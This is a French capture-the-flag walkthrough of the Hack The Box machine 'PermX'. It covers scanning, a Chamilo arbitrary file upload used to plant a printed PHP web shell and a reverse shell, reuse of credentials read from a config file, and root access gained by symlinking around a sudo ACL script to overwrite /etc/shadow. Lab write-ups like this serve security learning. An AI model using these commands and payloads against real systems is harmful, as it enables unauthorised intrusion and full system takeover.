  # PermX

	echo "10.10.11.23 permx.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.23 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.23 -oN nmap.txt
	feroxbuster --silent -u http://permx.htb
    ffuf -H "Host: FUZZ.permx.htb" -u http://permx.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18
	
Scans classiques.

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 
    80/tcp open  http    Apache httpd 2.4.52

Sous-domaines : 

    www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 35ms]
    lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 103ms]
	
http://lms.permx.htb/ => Formulaire de login

Robots.txt : 

    # Directories

    Disallow: /app/
    Disallow: /bin/
    Disallow: /documentation/
    Disallow: /home/
    Disallow: /main/
    Disallow: /plugin/
    Disallow: /tests/
    Disallow: /vendor/

    # Files
    Disallow: /license.txt
    Disallow: /README.txt
    Disallow: /whoisonline.php
    Disallow: /whoisonlinesession.php


http://lms.permx.htb/app/ => Directory listing

Un CVE sur Chamilo permet justement de faire de l'upload de fichier arbitraire : https://starlabs.sg/advisories/23/23-4220/#proof-of-concept

    curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
    ...
    curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php?cmd=id'

Fichier rce.php : 

    <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
    
Obtention du premier shell en www-data : 

    nc -nvlp 9999
    curl -F 'bigUploadFile=@reverse-shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
    curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/reverse-shell.php'
    whoami
    
## Pivoting

Credentials MySQL dans un fichier de configuration et réutilisables pour l'utilisateur mtz : 

    cat /var/www/chamilo/app/config/configuration.php
    ssh mtz@10.10.11.23
    cat user.txt	 

## Élévation de privilèges

	sudo -l
> (ALL : ALL) NOPASSWD: /opt/acl.sh

Ce script semble faire un chmod sur un argument donné : 

    /usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
    
La vérification qu'il y a contient un '*' : 

    if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then

On ne peut pas utiliser de ".." mais on peut faire des liens et donc écrire un peu partout : 

    ln -s / racine
    sudo /opt/acl.sh mtz rwx /home/mtz/racine/etc/shadow
    cat shadow
    
Réécriture du mot de passe de root : 

    echo 'root:$y$j9T$RUjBgvOODKC9hyu5u7zCt0$Vf7nqZ4umh3s1N69EeoQ4N5zoid6c2SlGb1LvBFRxSB:19742:0:99999:7:::' > /etc/shadow
    su
    cat /root/root.txt
